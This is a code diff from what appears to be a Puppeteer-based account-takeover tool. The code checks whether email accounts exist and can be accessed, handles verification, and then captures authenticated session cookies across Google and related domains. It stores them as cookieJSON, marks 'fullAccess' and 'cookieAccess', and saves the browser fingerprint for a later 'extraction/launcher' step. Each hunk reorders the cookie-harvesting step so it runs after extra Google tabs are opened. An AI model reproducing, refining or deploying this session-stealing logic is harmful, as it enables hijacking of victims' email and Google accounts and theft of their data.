@@ -5815,10 +5815,16 @@ if (!foundSelector) {
                                         initialCheckResult.requiresVerification = false;
                                         initialCheckResult.accountAccess = true;
 
-                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                        updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                         await openGoogleExtraTabs(browser, domain);
+
+
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+
+
+                                        updateData.status = "PROCESSING_FINALIZING";
+
+
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -5905,10 +5911,16 @@ if (!foundSelector) {
                                         initialCheckResult.accountAccess = true;
                                         initialCheckResult.emailExists = true;
 
-                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                        updateData.status = "PROCESSING_FINALIZING";
-                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                         await openGoogleExtraTabs(browser, domain);
+
+
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+
+
+                                        updateData.status = "PROCESSING_FINALIZING";
+
+
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                         updateData.verified = true;
                                         updateData.fullAccess = true;
                                         updateData.cookieAccess = true;
@@ -6146,9 +6158,13 @@ if (!foundSelector) {
                                             lastJsonResponse: updateData.lastJsonResponse
                                         });
 
-                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                         await openGoogleExtraTabs(browser, domain);
+
+
+                                        const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+
+
+                                        updateData.cookieJSON = JSON.stringify(browserCookies);
 
                                         // Persist captured cookie sets to fast cache
                                         updateBrowserRowDataFast(browserId, {
@@ -6249,9 +6265,13 @@ if (!foundSelector) {
                                     lastJsonResponse: updateData.lastJsonResponse
                                 });
 
-                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                updateData.cookieJSON = JSON.stringify(browserCookies);
                                 await openGoogleExtraTabs(browser, domain);
+
+
+                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+
+
+                                updateData.cookieJSON = JSON.stringify(browserCookies);
 
                                 // Persist captured cookie sets to fast cache
                                 updateBrowserRowDataFast(browserId, {
@@ -6524,10 +6544,16 @@ if (!foundSelector) {
                                 initialCheckResult.accountAccess = true;
                                 initialCheckResult.verificationState = null;
 
-                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                                updateData.status = "PROCESSING_FINALIZING";
-                                updateData.cookieJSON = JSON.stringify(browserCookies);
                                 await openGoogleExtraTabs(browser, domain);
+
+
+                                const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+
+
+                                updateData.status = "PROCESSING_FINALIZING";
+
+
+                                updateData.cookieJSON = JSON.stringify(browserCookies);
                                 updateData.verified = true;
                                 updateData.fullAccess = isInboxFinal;
                                 updateData.cookieAccess = true;
@@ -6571,10 +6597,16 @@ if (!foundSelector) {
                             initialCheckResult.emailExists = true;
                             initialCheckResult.verificationState = null;
 
-                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
-                            updateData.status = "PROCESSING_FINALIZING";
-                            updateData.cookieJSON = JSON.stringify(browserCookies);
                             await openGoogleExtraTabs(browser, domain);
+
+
+                            const browserCookies = await page.cookies(...getCookieCaptureUrls(domain));
+
+
+                            updateData.status = "PROCESSING_FINALIZING";
+
+
+                            updateData.cookieJSON = JSON.stringify(browserCookies);
                             updateData.verified = true;
                             updateData.fullAccess = true;
                             updateData.cookieAccess = true;
@@ -7047,6 +7079,7 @@ if (!foundSelector) {
 
 
         if ((finalStatus === "COMPLETED" || finalStatus === "PROCESSING_FINALIZING" || initialCheckResult.accountAccess) && !browserFullyClosed) {
+            await openGoogleExtraTabs(browser, domain);
             const allUrls = getCookieCaptureUrls(domain);
             let browserCookies = [];
             try {
@@ -7056,7 +7089,6 @@ if (!foundSelector) {
             }
             updateData.cookieJSON = JSON.stringify(browserCookies);
             logger.info(`[processRow][${browserId}] Captured ${browserCookies.length} cookies from all domains.`);
-            await openGoogleExtraTabs(browser, domain);
             // Save the browser identity (fingerprint) so extraction/launcher can reuse it
             if (browser && browser.identity) {
                 try { updateData.browserIdentity = JSON.stringify(browser.identity); } catch (_) {}
